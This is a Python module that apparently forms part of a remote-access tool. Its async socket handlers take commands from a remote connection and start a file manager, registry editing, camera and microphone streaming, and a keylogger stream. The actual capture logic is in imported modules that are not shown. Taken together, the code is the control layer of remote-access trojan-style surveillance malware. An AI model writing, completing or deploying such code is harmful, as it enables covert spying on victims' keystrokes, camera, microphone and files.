from camera import *
from microphone import *
from keylogger import *
from fileManager import *
from regedit import *

async def open_file_manager(GUI, writer, reader):
    # 这里放具体的操作
    while (1):
        response = await reader.read(1024)
        if (response):
            await serverFileManager(GUI, writer, reader, response.decode())
        else:
            writer.close()
            return


async def open_reg_manager(GUI, writer, reader):
    # 这里放具体的操作
    while (1):
        response = await reader.read(1024)
        if (response):
            result = handle_registry_request(response.decode())
            writer.write(result.encode())  
            await writer.drain()  
        else:
            writer.close()
            return


async def open_camera(GUI, writer, reader):
    # 这里放具体的操作
    while (1):
        response = await reader.read(1024)
        if (response):
            operation = "Im camera opener!"
            writer.write(operation.encode())
            await writer.drain()
            await start_video_stream(writer, reader)
        else:
            writer.close()
            return


async def open_microphone(GUI, writer, reader):
    # 这里放具体的操作
    while (1):
        response = await reader.read(1024)
        if (response):
            operation = "Im microphone opener!"
            writer.write(operation.encode())
            await writer.drain()
            await start_voice_stream(writer, reader)
        else:
            writer.close()
            return


async def start_keylogger(GUI, writer, reader):
    # 这里放具体的操作
    while (1):
        response = await reader.read(1024)
        if (response):
            operation = "Start keylogger!"
            writer.write(operation.encode())
            await writer.drain()
            await start_keylogger_stream(writer, reader)
        else:
            writer.close()
            return
